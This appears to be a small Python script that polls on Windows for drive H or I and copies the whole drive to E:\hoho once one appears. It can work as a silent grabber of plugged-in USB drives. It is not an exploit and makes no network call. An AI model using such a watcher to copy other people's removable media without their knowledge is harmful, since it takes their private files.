import platform,os,sys,shutil,time

def hasdrive(letter):
    return "Windows" in platform.system() and os.system(f"{letter}:") == 0

drives = ["H", "I"]

dst = "E:\\hoho"

while True:
    for x in drives:
        if hasdrive(x):
            try:
                src = x+":\\"
                os.chdir(src)
                shutil.copytree(src,dst)
                break
                exit()
            except FileExistsError:
                exit()
    print('notdone')
    time.sleep(5)
